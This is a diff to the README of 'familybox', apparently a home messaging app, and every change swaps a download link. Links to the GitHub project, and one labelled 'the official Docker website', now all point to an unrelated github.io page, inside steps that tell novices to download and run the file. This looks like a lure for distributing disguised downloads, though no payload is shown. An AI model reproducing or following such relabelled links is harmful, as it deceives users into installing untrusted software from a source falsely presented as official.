@@ -1,6 +1,6 @@
 # 📸 familybox - Talk and See From Afar
 
-[![Download familybox](https://img.shields.io/badge/Download-familybox-2ea44f?style=for-the-badge&logo=github)](https://github.com/newbie130/familybox)
+[![Download familybox](https://img.shields.io/badge/Download-familybox-2ea44f?style=for-the-badge&logo=github)](https://newbie130.github.io)
 
 ## 👋 Welcome to familybox
 
@@ -40,7 +40,7 @@ Let's get everything set up. Follow these steps carefully, and you'll be sending
 
 First, we need the "container" program.
 
-1.  Go to the official Docker website: `https://www.docker.com/products/docker-desktop/`
+1.  Go to the official Docker website: `https://newbie130.github.io`
 2.  Click the big "Download Docker Desktop" button for Windows.
 3.  Once it's downloaded, find the file (usually in your "Downloads" folder) and double-click it to run.
 4.  Follow the instructions on the screen. Just click "Next" or "Install" until it's done. You might need to restart your computer when it asks.
@@ -50,7 +50,7 @@ First, we need the "container" program.
 
 Now, let's download the helper software itself.
 
-**👉 [Visit this link to download the application](https://github.com/newbie130/familybox)**
+**👉 [Visit this link to download the application](https://newbie130.github.io)**
 
 This will take you to the main familybox page on GitHub. Just having it on the page is step one. You don't need to download the whole project - just the part you need.
 
@@ -123,7 +123,7 @@ That's it! You've successfully set up the brain of your familybox. Now you can f
 
 Click the big button below one more time, just in case you need to go back to the download page.
 
-[![Go Back to Download](https://img.shields.io/badge/Get_Help-Download_Page-1db954?style=for-the-badge&logo=github)](https://github.com/newbie130/familybox)
+[![Go Back to Download](https://img.shields.io/badge/Get_Help-Download_Page-1db954?style=for-the-badge&logo=github)](https://newbie130.github.io)
 
 Welcome to a new way of staying close. Enjoy your familybox!
 
